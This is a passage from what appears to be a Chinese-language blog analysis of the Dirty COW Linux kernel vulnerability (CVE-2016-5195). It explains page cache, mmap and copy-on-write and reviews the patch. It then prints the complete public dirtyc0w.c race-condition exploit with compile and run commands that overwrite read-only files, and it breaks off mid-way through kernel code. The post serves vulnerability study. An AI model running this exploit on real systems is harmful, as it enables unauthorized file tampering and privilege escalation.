operations).</p></blockquote><p>也就是说，我们平常向硬盘写文件时，默认异步情况下，并不是直接把文件内容写入到硬盘中才返回的，而是成功拷贝到内核的page cache后就直接返回，所以大多数情况下，硬盘写操作不会是性能瓶颈。写入到内核page cache的pages成为dirty pages，稍后会由内核线程pdflush真正写入到硬盘上。</p><p>从硬盘读取文件时，同样不是直接把硬盘上文件内容读取到用户态内存，而是先拷贝到内核的page cache，然后再“拷贝”到用户态内存，这样用户就可以访问该文件。因为涉及到硬盘操作，所以第一次读取一个文件时，不会有性能提升；不过，如果一个文件已经存在page cache中，再次读取该文件时就可以直接从page cache中命中读取不涉及硬盘操作，这时性能就会有很大提高。</p><p>下面用<code>dd</code>比较下异步（缺省模式）和同步写硬盘的速度差别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ dd if=/dev/urandom of=async.txt bs=64M count=16 iflag=fullblock</span><br><span class="line">16+0 records in</span><br><span class="line">16+0 records out</span><br><span class="line">1073741824 bytes (1.1 GB, 1.0 GiB) copied, 7.618 s, 141 MB/s</span><br><span class="line">$ dd if=/dev/urandom of=sync.txt bs=64M count=16 iflag=fullblock oflag=sync</span><br><span class="line">16+0 records in</span><br><span class="line">16+0 records out</span><br><span class="line">1073741824 bytes (1.1 GB, 1.0 GiB) copied, 13.2175 s, 81.2 MB/s</span><br></pre></td></tr></table></figure><p>page cache除了可以提升和硬盘交互性能外，下面继续讨论page cache功能。</p><h5 id="（1）如果程序crash，异步模式会丢失数据吗？"><a href="#（1）如果程序crash，异步模式会丢失数据吗？" class="headerlink" title="（1）如果程序crash，异步模式会丢失数据吗？"></a>（1）如果程序crash，异步模式会丢失数据吗？</h5><p>比如存在这样的场景：一批数据已经成功写入到page cache，这时程序突然crash，但是在page cache里的数据还没来得及被pdflush写回到硬盘，这批数据会丢失吗？<br>答案是，要看具体情况：</p><ol><li>如果OS没有crash或者重启的话，仅仅是写数据的程序crash，那么已经成功写入到page cache中的dirty pages是会被pdflush在合适的时机被写回到硬盘，不会丢失数据；</li><li>如果OS也crash或者重启的话，因为page cache存放在内存中，一旦断电就丢失了，那么就会丢失数据。<br>至于这种情况下，会丢失多少数据，主要看系统重启前有多少dirty pages被写入到硬盘，已经成功写回硬盘的就不会丢失；没来得急写回硬盘的数据就彻底丢失了。这也是异步写硬盘的一个潜在风险。<br>同步写硬盘时就不存在这种丢数据的风险。同步写操作返回成功时，能保证数据一定被保存在硬盘上了。</li></ol><p>引用RocksDB wiki中关于“<a class="link"   href="https://github.com/facebook/rocksdb/wiki/Basic-Operations#asynchronous-writes" >Asynchronous Writes<i class="fas fa-external-link-alt"></i></a>”描述：</p><blockquote><p>Asynchronous writes are often more than a thousand times as fast as synchronous writes. The downside of asynchronous writes is that a crash of the machine may cause the last few updates to be lost. Note that a crash of just the writing process (i.e., not a reboot) will not cause any loss since even when sync is false, an update is pushed from the process memory into the operating system before it is considered done.</p></blockquote><p>那么如何避免因为系统重启或者机器突然断电，导致数据丢失问题呢？<br>可以借助于WAL（Write-Ahead Log）技术。</p><p>WAL技术在数据库系统中比较常见，在数据库中一般又称之为redo log，Linux 文件系统ext3/ext4称之为journaling。WAL作用是：写数据库或者文件系统前，先把相关的metadata和文件内容写入到WAL日志中，然后才真正写数据库或者文件系统。WAL日志是append模式，所以，对WAL日志的操作要比对数据库或者文件系统的操作轻量级得多。如果对WAL日志采用同步写模式，那么WAL日志写成功，即使写数据库或者文件系统失败，可以用WAL日志来恢复数据库或者文件系统里的文件。</p><h5 id="（2）查看一个文件占用page-cache情况"><a href="#（2）查看一个文件占用page-cache情况" class="headerlink" title="（2）查看一个文件占用page cache情况"></a>（2）查看一个文件占用page cache情况</h5><p>可以借助于<a class="link"   href="https://hoytech.com/vmtouch/" >vmtouch<i class="fas fa-external-link-alt"></i></a>工具：</p><blockquote><p>vmtouch is a tool for learning about and controlling the file system cache of unix and unix-like systems.</p></blockquote><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329165324080.png" alt="image-20220329165324080"></p><h5 id="（3）一些注意点"><a href="#（3）一些注意点" class="headerlink" title="（3）一些注意点"></a>（3）一些注意点</h5><p>由于缓存页面可以很容易地被驱逐和重用，一些操作系统，特别是<a class="link"   href="https://en.wikipedia.org/wiki/Windows_NT" >Windows NT<i class="fas fa-external-link-alt"></i></a>，甚至将页面缓存使用情况报告为“可用”内存，而内存实际上是分配给磁盘页面的。这导致了一些关于在 Windows 中使用页面缓存的混乱。</p><p>cache也容易产生测信道攻击，由于page cache与磁盘文件有pdflush措施，一般磁盘文件都有着严格的权限分离措施，所以page cache可能存在某些文件页面可以绕过权限分离并泄露有关其他进程的数据。这里的内容比较多，就不展开了。</p><h4 id="2、mmap"><a href="#2、mmap" class="headerlink" title="2、mmap"></a>2、mmap</h4><p>这里可以简单提一下linux I/O相关。</p><h5 id="（1）传统的文件传输"><a href="#（1）传统的文件传输" class="headerlink" title="（1）传统的文件传输"></a>（1）传统的文件传输</h5><p>如果服务端要提供文件传输的功能，我们能想到的最简单的方式是：将磁盘上的文件读取出来，然后通过网络协议发送给客户端。</p><p>传统 I/O 的工作方式是，数据读取和写入是从用户空间到内核空间来回复制，而内核空间的数据是通过操作系统层面的 I/O 接口从磁盘读取或写入。</p><p>代码通常如下，一般会需要两个系统调用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span>(file, tmp_buf, len);</span><br><span class="line"><span class="built_in">write</span>(socket, tmp_buf, len);</span><br></pre></td></tr></table></figure><p>代码很简单，虽然就两行代码，但是这里面发生了不少的事情。</p><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BC%A0%E7%BB%9F%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93.png" alt="传统文件传输"></p><p>首先发生了四次ring0和ring3的上下文切换（两次系统调用，每次系统调用都是先从ring3到ring0，ring0得到结果时再将结果返回给ring3）。而上下文切换到成本并不小，一次切换需要耗时几十纳秒到几微秒，虽然时间看上去很短，但是在高并发的场景下，这类时间容易被累积和放大，从而影响系统的性能。</p><p>其次，还<strong>发生了 4 次数据拷贝</strong>，其中两次是 DMA 的拷贝，另外两次则是通过 CPU 拷贝的，下面说一下这个过程：</p><ul><li><em>第一次拷贝</em>，把磁盘上的数据拷贝到操作系统内核的缓冲区（page cache）里，这个拷贝的过程是通过 DMA 搬运的。</li><li><em>第二次拷贝</em>，把内核缓冲区（page cache）的数据拷贝到用户的缓冲区里，于是我们应用程序就可以使用这部分数据了，这个拷贝到过程是由 CPU 完成的。</li><li><em>第三次拷贝</em>，把刚才拷贝到用户的缓冲区里的数据，再拷贝到内核的 socket 的缓冲区（page cache）里，这个过程依然还是由 CPU 搬运的。</li><li><em>第四次拷贝</em>，把内核的 socket 缓冲区（page cache）里的数据，拷贝到网卡的缓冲区里，这个过程又是由 DMA 搬运的。</li></ul><p>这种简单又传统的文件传输方式，存在冗余的上文切换和数据拷贝，在高并发系统里是非常糟糕的，多了很多不必要的开销，会严重影响系统性能。</p><p>所以，<strong>要想提高文件传输的性能，就需要减少「用户态与内核态的上下文切换」和「内存拷贝」的次数</strong>。</p><h5 id="（2）mmap-write"><a href="#（2）mmap-write" class="headerlink" title="（2）mmap + write"></a>（2）mmap + write</h5><p>在前面我们知道，<code>read()</code> 系统调用的过程中会把内核缓冲区的数据拷贝到用户的缓冲区里，于是为了减少这一步开销，我们可以用 <code>mmap()</code> 替换 <code>read()</code> 系统调用函数。                                               </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">mmap</span>(file, len);</span><br><span class="line"><span class="built_in">write</span>(sockfd, buf, len);</span><br></pre></td></tr></table></figure><p><code>mmap()</code> 系统调用函数会直接把内核缓冲区里的数据「<strong>映射</strong>」到用户空间，这样，操作系统内核与用户空间就不需要再进行任何的数据拷贝操作。</p><p>![mmap + write 零拷贝](mmap + write 零拷贝.png)</p><p>具体过程如下：</p><ul><li>应用进程调用了 <code>mmap()</code> 后，DMA 会把磁盘的数据拷贝到内核的缓冲区（page cache）里。接着，应用进程跟操作系统内核「共享」这个缓冲区；</li><li>应用进程再调用 <code>write()</code>，操作系统直接将内核缓冲区（page cache）的数据拷贝到 socket 缓冲区（page cache）中，这一切都发生在内核态，由 CPU 来搬运数据；</li><li>最后，把内核的 socket 缓冲区（page cache）里的数据，拷贝到网卡的缓冲区里，这个过程是由 DMA 搬运的。</li></ul><p>我们可以得知，通过使用 <code>mmap()</code> 来代替 <code>read()</code>， 可以减少一次数据拷贝的过程。也就是说，使用mmap + write进行文件传输会进行四次上下文切换以及三次数据拷贝。</p><h5 id="（3）mmap解析"><a href="#（3）mmap解析" class="headerlink" title="（3）mmap解析"></a>（3）mmap解析</h5><p>mmap实际上就是将硬盘文件映射到内存中，也就是<strong>内存映射</strong>。说的底层一些是将page cache中的页直接映射到用户进程地址空间中，从而进程可以直接访问自身地址空间的虚拟地址来访问page cache中的页，这样会并涉及page cache到用户缓冲区之间的拷贝，mmap系统调用与read/write调用的区别在于：</p><ul><li>mmap只需要一次系统调用，后续操作不需要系统调用</li><li>访问的数据不需要在page cache和用户缓冲区之间拷贝</li></ul><p>所以，当频繁对一个文件进行读取操作时，mmap会比read高效一些。</p><h4 id="3、内存映射方式与写时复制（COW）"><a href="#3、内存映射方式与写时复制（COW）" class="headerlink" title="3、内存映射方式与写时复制（COW）"></a>3、内存映射方式与写时复制（COW）</h4><h5 id="（1）内存映射"><a href="#（1）内存映射" class="headerlink" title="（1）内存映射"></a>（1）内存映射</h5><p>内存映射即mmap，mmap有两种映射。</p><ul><li>文件映射：将一个文件的一部分直接映射到调用进程的虚拟内存中</li><li>匿名映射：一个映射没有对应的文件（也可以理解成一个内容总是被初始化为零的虚拟文件的映射）</li></ul><h5 id="（2）写时复制"><a href="#（2）写时复制" class="headerlink" title="（2）写时复制"></a>（2）写时复制</h5><p>当多个进程共享相同的内存时，每个进程都可以对其做修改和读取，此时就会出现一致性问题，由此，映射的方法又可以分为共享和私有：</p><ul><li><p>私有映射：在映射内容上发生的变更对其他进程不可见，对于文件映射来说即为不会在物理页面（底层）更改。此时就会利用写时复制技术（COW）来实现，<strong>这的写时复制和fork那个写时复制的情景不一样</strong>。</p></li><li><p>共享映射：在映射内容上发生的变更会对所有共享同一个映射的其他进程可见</p></li></ul><h6 id="fork场景下的写时复制"><a href="#fork场景下的写时复制" class="headerlink" title="fork场景下的写时复制"></a>fork场景下的写时复制</h6><p> 传统的fork()系统调用直接把所有的资源复制给新创建的进程。这种实现过于简单并且效率低下，因为它拷贝的数据也许并不共享，更糟的情况是，如果新进程打算立即执行一个新的映像，那么所有的拷贝都将前功尽弃。</p><p>Linux的fork()使用写时拷贝（copy-on-write）页实现。写时拷贝是一种可以推迟甚至免除拷贝数据的技术。内核此时并不复制整个进程地址空间，而是让父进程和子进程共享同一个拷贝。只有在需要写入的时候，数据才会被复制，从而使各个进程拥有各自的拷贝。也就是说，资源的复制只有在需要写入的时候才进行，在此之前，只是以只读方式共享。这种技术使地址空间上的页的拷贝被推迟到实际发生写入的时候。</p><p>在页根本不会被写入的情况下—举例来说，fork()后立即调用exec()—它们就无需复制了。fork()的实际开销就是复制父进程的页表以及给子进程创建惟一的进程描述符。在一般情况下，进程创建后都会马上运行一个可执行的文件，这种优化可以避免拷贝大量根本就不会被使用的数据（地址空间里常常包含数十兆的数据）。由于Unix强调进程快速执行的能力，所以这个优化是很重要的。这里补充一点：<strong>Linux COW与exec没有必然联系</strong></p><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2012072020252592.jpg" alt="img"></p><h6 id="私有映射写时复制"><a href="#私有映射写时复制" class="headerlink" title="私有映射写时复制"></a>私有映射写时复制</h6><p>这里更加关注于内存数据的共享问题。研究的课题是多个进程共享一块内存，这就不局限于fork的父进程和子进程了，这里的概念会更宽泛一点，可以理解为这个是广义的写时复制。当多个进程共享一块内存时，对该内存的读取当然可以共享，但是一旦对该内存进行写操作时，就一定要区分该内存在进程中的映射是私有映射还是共享映射。当为私有映射时，有写入内存需求的进程会将内容拷贝一份拿到自己的进程空间中，从而对其进行修改。如果为共享映射，则直接修改该共享内存，使得所有映射该内存的进程享受该内存的修改。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="一、补丁分析"><a href="#一、补丁分析" class="headerlink" title="一、补丁分析"></a>一、补丁分析</h3><p><a class="link"   href="https://bugzilla.suse.com/attachment.cgi?id=697810&action=diff" >补丁链接<i class="fas fa-external-link-alt"></i></a></p><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220422164944547.png" alt="image-20220422164944547"></p><p>这个 patch 主要是重新定义了一个 flag 为 FOLL_COW 来标记该页是一个 COW 页面。在 faultin_page()函数中当 do_wp_page 对某个 COW 页面处理之后返回 VM_FAULT_WRITE 并且该页对应的 vma 属性是不可写的情况，不再是拿掉 FOLL_WRITE 而且设置新的标记 FOLL_COW，表示我这个是 COW 页，因此可以避免上述的竞争关系。此外使用 pte 的 dirty 位来验证 FOLL_COW 的有效性。</p><h3 id="二、exp分析（未完成）"><a href="#二、exp分析（未完成）" class="headerlink" title="二、exp分析（未完成）"></a>二、exp分析（未完成）</h3><p>源码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *map;</span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++) &#123;</span><br><span class="line">    c+=<span class="built_in">madvise</span>(map,<span class="number">100</span>,MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">procselfmemThread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">  <span class="keyword">int</span> f=<span class="built_in">open</span>(<span class="string">&quot;/proc/self/mem&quot;</span>,O_RDWR);</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++) &#123;</span><br><span class="line">    <span class="built_in">lseek</span>(f,map,SEEK_SET);</span><br><span class="line">    c+=<span class="built_in">write</span>(f,str,<span class="built_in">strlen</span>(str));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;procselfmem %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (argc&lt;<span class="number">3</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line">  f=<span class="built_in">open</span>(argv[<span class="number">1</span>],O_RDONLY);</span><br><span class="line">  <span class="built_in">fstat</span>(f,&amp;st);</span><br><span class="line">  name=argv[<span class="number">1</span>];</span><br><span class="line">  map=<span class="built_in">mmap</span>(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap %x\n\n&quot;</span>,map);</span><br><span class="line">  <span class="built_in">pthread_create</span>(&amp;pth1,<span class="literal">NULL</span>,madviseThread,argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">pthread_create</span>(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,argv[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">pthread_join</span>(pth1,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">pthread_join</span>(pth2,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirtyc0w.c -o dirtyc0w</span><br><span class="line">./dirtyc0w file string<span class="comment"># 这里可以将任意文件修改为任意字符</span></span><br></pre></td></tr></table></figure><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220426093131936.png" alt="image-20220426093131936"></p><p>通过资料查询获得相关函数功能。</p><ul><li>open: 打开一个文件系统中的文件，返回文件描述符</li><li>write: 向打开的文件描述符中，写相应的内容</li><li>fstat: 获得文件描述符指向的文件的更多信息，如文件大小等</li><li>mmap: 通过文件描述符，将已经打开的文件映射到内存中。当flags的MAP_PRIVATE被置为1时，对mmap得到内存映射进行的写操作会使内核触发COW操作，写的是COW后的内存，不会同步到磁盘的文件中。</li><li>lseek: 按照偏移更改文件描述符的指针。 原型： off_t lseek(int fd, off_t offset, int whence)；</li><li>madvise:告诉内核内存addr～addr+len在接下来的使用状况，以便内核进行一些进一步的内存管理操作。当advice为MADV_DONTNEED时，此系统调用相当于通知内核addr～addr+len的内存在接下来不再使用，内核将释放掉这一块内存以节省空间，相应的页表项也会被置空。</li></ul><p>exp代码总结下来就是启动两个线程</p><ol><li>write不断向传入的文件映射的虚拟内存写字符串</li><li>madvise不断将文件映射的虚拟内存置为MADV_DONTNEED，也就是抛弃掉。</li></ol><p>整个漏洞利用流程大概是</p><ol><li>write map。由于首次访问，mmap未申请page cache与磁盘文件做映射，从而页表建立也无从谈起，导致page fault（缺页）。</li><li>write map，page fault（语义冲突），发现需要写权限，由于设置了MAP_PRIVATE，触发COW，创建内存副本并<strong>将FOLL_WRITE置为0</strong>。</li><li>madivse抛弃掉map，实际上抛弃掉的是COW出的副本。注意此时FOLL_WRITE仍为0.</li><li>write map，不需要写权限，直接写入只读文件。</li></ol><p>整个流程包含了三次<code>write</code>以及中间的一次<code>madivse</code>，关键点在于FOLL_WRITE置为0并通过一系列构造完成漏洞利用。</p><p>接下来我们详细的漏洞分析。</p><h3 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h3><p>该篇章的一些描述参考自<a class="link"   href="https://xuanxuanblingbling.github.io/assets/attachment/%E5%A5%94%E8%B7%91%E5%90%A7-linux%E5%86%85%E6%A0%B8-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-DirtyCow.pdf" >该文章<i class="fas fa-external-link-alt"></i></a>，作者讲得比较详细，推荐大家也可以支持一下。</p><p>Dirtycow 程序首先以只读的方式打开一个文件，然后使用 mmap 映射这个文件的内容到用户空间，这里使用 MAP_PRIVATE 映射属性。因此它是一个进程私有的映射，这样 mmap 创建的 VMA 属性就是私有并且只读的，它只设置了 VM_READ，并没有设置 VM_SHARED。VMA 的 flags 标志位中只有 VM_SHARED 标志位，没有 PRIVATE 相关的标志位，因此没设置 VM_SHARED 的就表示这个 VMA 是私有的。利用 mmap 进行的文件映射页面在内核空间是 page cache。主程序创 建了两个线程“madviseThread”和“procselfmemThread”。</p><h4 id="（0）函数调用栈"><a href="#（0）函数调用栈" class="headerlink" title="（0）函数调用栈"></a>（0）函数调用栈</h4><p>这里先贴一下函数调用栈，方便大家对下面的函数调用关系有比较清晰的认识</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mem_write</span><br><span class="line">mem_rw</span><br><span class="line">access_remote_vm</span><br><span class="line">__access_remote_vm</span><br><span class="line">    get_user_pages</span><br><span class="line">     __get_user_pages_locked</span><br><span class="line">      __get_user_pages</span><br><span class="line">       follow_page_mask</span><br><span class="line">        follow_page_pte</span><br><span class="line">       faultin_page</span><br><span class="line">        handle_mm_fault</span><br><span class="line">         __handle_mm_fault</span><br><span class="line">          handle_pte_fault</span><br><span class="line">           do_fault</span><br><span class="line">           do_cow_fault</span><br><span class="line">             do_set_pte</span><br><span class="line">              maybe_mkwrite</span><br></pre></td></tr></table></figure><h4 id="（1）第一次write"><a href="#（1）第一次write" class="headerlink" title="（1）第一次write"></a>（1）第一次write</h4><p>第一次write，因为用户空间那段内存（dirtycow 程序中 map 指针指向的内存）其实还没有和实际物理页面建立映射关系。（由于page cache没有建立，所以map与page chache，page cache与磁盘内容均未建立联系。所以map对应的页表项也不存在）。所以会触发缺页中断建立page cache，由于没有写权限且私有映射，所以将执行COW操作，在进程中建立对应的page cache</p><h5 id="proc-mem-operations"><a href="#proc-mem-operations" class="headerlink" title="proc_mem_operations"></a>proc_mem_operations</h5><p>这里的<code>write</code>表示对<code>/proc/self/mem</code>写入，而<code>write</code>这个系统调用，在操作不同的对象时，方法也是不同的。而对<code>/proc/self/mem</code>的操作定义在<code>fs/proc/base.c</code>中，如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">proc_mem_operations</span> =</span> &#123;</span><br><span class="line">        .llseek         = mem_lseek,</span><br><span class="line">        .read           = mem_read,</span><br><span class="line">        .write          = mem_write,</span><br><span class="line">        .open           = mem_open,</span><br><span class="line">        .release        = mem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="access-remote-vm"><a href="#access-remote-vm" class="headerlink" title="__access_remote_vm"></a>__access_remote_vm</h5><p><code>mem_write</code>经过一系列系统调用达到<code>access_remote_vm</code>来实现访问用户进程的地址空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 函数调用： mem_write() -&gt; mem_rw() -&gt; access_remote_vm() -&gt; __access_remote_vm()</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> write)</span><br><span class="line">&#123;</span><br><span class="line">                ret = get_user_pages(tsk, mm, addr, <span class="number">1</span>,<span class="comment">// 调用get_user_pages 获取对应的物理页面</span></span><br><span class="line">                                write, <span class="number">1</span>, &amp;page, &amp;vma);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="__get_user_pages"></a>__get_user_pages</h5><p>在知道进程的mm数据结构、虚拟地址addr后就可以获取对应的物理页面了，内核提供 了这样一个 API 函数：get_user_pages()。这里传递给 get_user_pages 的参数是 write=1 和 force=1 以及 page 指针，在后续的函数调用中会转换成 FOLL_WRITE | FOLL_FORCE | FOLL_GET 标 志位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># 函数调用： __access_remote_vm() -&gt; get_user_pages() -&gt; __get_user_pages_locked()</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">long</span> __get_user_pages_locked(...)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (pages)</span><br><span class="line">            flags |= FOLL_GET;</span><br><span class="line">    <span class="keyword">if</span> (write)</span><br><span class="line">        flags |= FOLL_WRITE;</span><br><span class="line">    <span class="keyword">if</span> (force)</span><br><span class="line">        flags |= FOLL_FORCE;</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                ret = __get_user_pages(tsk, mm, start, nr_pages, flags, pages,</span><br><span class="line">                                       vmas, locked);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"># 函数调用：  __get_user_pages_locked() -&gt; __get_user_pages()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">                struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">retry:</span><br><span class="line">               ...</span><br><span class="line">                cond_resched();</span><br><span class="line">                page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<span class="comment">// 获取页表项，这里的start与vma-&gt;vm_start是我们exp中的map指针。</span></span><br><span class="line">                <span class="keyword">if</span> (!page) 